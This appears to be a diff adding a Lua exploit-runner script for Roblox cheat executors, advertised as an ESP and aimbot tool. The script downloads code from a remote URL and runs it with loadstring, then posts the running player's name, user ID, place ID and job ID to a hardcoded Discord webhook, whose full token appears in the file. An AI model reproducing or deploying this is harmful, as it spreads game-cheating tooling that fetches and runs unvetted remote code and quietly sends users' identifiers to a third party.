@@ -1,0 +1,161 @@
+-- Exploit-runner + webhook notifier
+-- Works in executors that expose http_request / syn.request / request and allow game:HttpGet
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local lp = Players.LocalPlayer
+
+-- CONFIG: put your webhook here
+local WEBHOOK = "https://discord.com/api/webhooks/1422207011889742005/Ynt6qwGcJYESSRZ_HjHwF-LDK3pUxjiztfMGd29oc7A49bC8xg7ZnrSJbmKISQFdeMtC"
+
+-- the remote lua URL you want to load (UPDATE THIS to a valid Lua script URL)
+local REMOTE_URL = "https://raw.githubusercontent.com/RobloxScripter256/MM-Universal-Esp/refs/heads/main/README.md" -- Placeholder, replace with correct Lua script URL
+
+-- Prevent multiple executions
+if _G.ExploitRunnerLoaded then
+    warn("Script already running, aborting.")
+    return
+end
+_G.ExploitRunnerLoaded = true
+
+-- Executor HTTP function chooser
+local http = http_request or (syn and syn.request) or request
+local function executorRequest(req)
+    if not http then
+        error("No executor HTTP function found. This must run in an executor (Synapse/other).")
+    end
+    local ok, response = pcall(http, req)
+    if not ok then
+        warn("Executor HTTP request failed:", response)
+        return nil
+    end
+    return response
+end
+
+-- Fetch remote code (using game:HttpGet or executor-safe fallback)
+local function fetchRemote(url)
+    local response
+    -- Try game:HttpGet first
+    if type(game.HttpGet) == "function" then
+        local ok, res = pcall(function() return game:HttpGet(url, true) end) -- Synchronous fetch
+        if ok and res then
+            print("Fetched remote code with game:HttpGet")
+            return res
+        end
+        warn("game:HttpGet failed:", res)
+    end
+    -- Fallback: executorRequest style
+    local req = { Url = url, Method = "GET" }
+    response = executorRequest(req)
+    if response then
+        -- Handle different response formats
+        if type(response) == "table" then
+            return response.Body or response.ResponseBody or response.body or tostring(response)
+        end
+        return tostring(response)
+    end
+    warn("Failed to fetch remote code from", url)
+    return nil
+end
+
+-- Safe run of remote code using loadstring
+local function runRemote(url)
+    local code = fetchRemote(url)
+    if not code then
+        return false, "fetch_failed"
+    end
+
+    -- Basic check to ensure content resembles Lua code
+    if not code:match("function") and not code:match("local") and not code:match("end") then
+        warn("Remote content does not appear to be Lua code")
+        return false, "invalid_code"
+    end
+
+    local fn, err = loadstring(code)
+    if not fn then
+        warn("loadstring error:", err)
+        return false, err
+    end
+
+    local ok, runErr = pcall(fn)
+    if not ok then
+        warn("Remote code runtime error:", runErr)
+        return false, runErr
+    end
+    return true
+end
+
+-- Send webhook (executor-style POST)
+local function sendWebhook(status, errorMsg)
+    local display = lp.DisplayName or lp.Name
+    local username = lp.Name
+    local playerNamePart = string.format("%s (@%s)", display, username)
+
+    local embed = {
+        title = status == "success" and "Script Executed" or "Script Execution Failed",
+        description = "**PlayerName:** " .. playerNamePart,
+        color = status == "success" and 16753920 or 16711680, -- Orange for success, red for failure
+        fields = {
+            { name = "Time", value = os.date("%Y-%m-%d %H:%M:%S", os.time()), inline = true },
+            { name = "ScriptName", value = "Beta Esp+Aimbot", inline = true },
+            { name = "UserId", value = tostring(lp.UserId), inline = true },
+            { name = "PlaceId", value = tostring(game.PlaceId), inline = true },
+            { name = "JobId", value = tostring(game.JobId or "N/A"), inline = true },
+        },
+        footer = { text = "Exploit-run notifier" }
+    }
+
+    -- Add error message for failed executions
+    if status ~= "success" then
+        table.insert(embed.fields, { name = "Error", value = tostring(errorMsg), inline = false })
+    end
+
+    local payload = {
+        username = "Exploit Logger",
+        embeds = { embed }
+    }
+
+    local body = HttpService:JSONEncode(payload)
+
+    if not http then
+        warn("No executor HTTP function available for POST.")
+        return false, "no_http"
+    end
+
+    local ok, res = pcall(function()
+        return executorRequest({
+            Url = WEBHOOK,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = body
+        })
+    end)
+
+    if not ok then
+        warn("Webhook POST failed:", res)
+        return false, res
+    end
+
+    -- Check response status if available
+    if type(res) == "table" and res.StatusCode then
+        if res.StatusCode >= 200 and res.StatusCode < 300 then
+            print("Webhook sent successfully.")
+            return true
+        else
+            warn("Webhook POST returned non-success status:", res.StatusCode, res.StatusMessage or "")
+            return false, "http_" .. tostring(res.StatusCode)
+        end
+    end
+
+    -- Assume success if no status code
+    print("Webhook sent (no status code available).")
+    return true
+end
+
+-- MAIN: run remote, then notify webhook
+local success, err = runRemote(REMOTE_URL)
+local status = success and "success" or "failure"
+local s, e = sendWebhook(status, err)
+if not s then
+    warn("Webhook send failed:", e)
+end
